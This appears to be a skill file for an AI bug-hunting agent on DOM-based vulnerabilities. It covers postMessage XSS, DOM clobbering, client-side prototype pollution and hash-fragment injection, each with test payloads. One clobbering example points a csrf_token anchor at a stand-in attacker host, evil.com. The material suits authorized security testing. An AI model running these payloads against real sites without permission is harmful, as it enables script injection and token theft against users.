---
name: hunt-dom
description: Hunt DOM-based client-side vulnerabilities — DOM XSS via postMessage, DOM clobbering via anchor tags/innerHTML/innerText sinks, client-side prototype pollution via URL/JSON.parse, DOM injection through hash/fragment manipulation, DOM Stager and DOM Invader tooling. Use when target uses heavy client-side JS, SPA frameworks, or postMessage-based cross-origin communication.
sources: portswigger_research, dom_security_research
report_count: 1
---

# HUNT-DOM — DOM-Based Vulnerability Hunting

## Crown Jewel Targets
- **postMessage XSS** — no origin validation → inject event listener payload
- **DOM Clobbering** — overwrite global variables via HTML id/name attributes
- **Client-side Prototype Pollution** — merge user input into window.__proto__
- **Hash/fragment injection** — `location.hash` flows into innerHTML
- **DOM Invader (Burp)** — automatic DOM XSS detection

## Phase 1 — postMessage Analysis
```bash
# Find postMessage event listeners in JS bundles
grep -r "addEventListener.*message\|onmessage\s*=" js_bundles/

# Test generic payload in iframe
curl -s "https://$TARGET/" | grep -oP 'postMessage\([^)]+\)' | head -10
```

### postMessage XSS Test
```html
<iframe id="target" src="https://$TARGET/"></iframe>
<script>
document.getElementById('target').contentWindow.postMessage('javascript:alert(1)', '*');
</script>
```

## Phase 2 — DOM Clobbering
```html
<!-- Test via HTML injection / XSS that can't use <script> -->
<a id="config"></a>
<a id="config" name="csrf_token" href="https://evil.com/token"></a>
```

## Phase 3 — Client-side Prototype Pollution
```javascript
// Test in browser console on target page
// Via URL query string
// ?__proto__[isAdmin]=true
// Via JSON.parse in WebSocket messages
// {"__proto__": {"polluted": "yes"}}

// Detection
Object.prototype.polluted === "yes"  // if true → PP exists
```

## Phase 4 — Hash/Fragment Injection
```bash
# Test if location.hash flows into innerHTML or document.write
curl -s "https://$TARGET/#<img/src=x onerror=alert(1)>" | grep -i "innerHTML\|document.write"
```

## Tools
- **Burp DOM Invader** — built-in Burp tool for DOM XSS
- **Burp DOM Stager** — scan for DOM-based sinks

## Related Skills
- **hunt-xss** — reflected/stored XSS methodology
- **hunt-nodejs** — if DOM PP chains to Node.js backend
- **triage-validation** — 7-Question Gate
